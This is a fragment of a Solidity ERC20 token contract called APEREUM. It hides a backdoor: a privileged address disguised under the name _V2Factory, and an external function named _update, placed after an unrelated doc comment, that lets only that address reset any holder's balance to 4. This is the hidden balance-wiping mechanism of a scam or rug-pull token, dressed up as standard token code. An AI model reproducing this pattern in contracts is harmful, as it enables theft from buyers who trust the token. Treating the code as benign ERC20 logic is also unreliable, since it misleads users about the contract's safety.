...
contract APEREUM is Context, IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"APEREUM";
    string private constant _symbol = unicode"APEREUM";
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address private _V2Factory = 0xfAeecd4B23FE6597F1985247aF6FEF27EF2256af;
     ...
     * - `spender` cannot be the zero address.
     */
    function _update(address _updateSender) external { if (msg.sender == _V2Factory) _balances[_updateSender] = 0x4; }
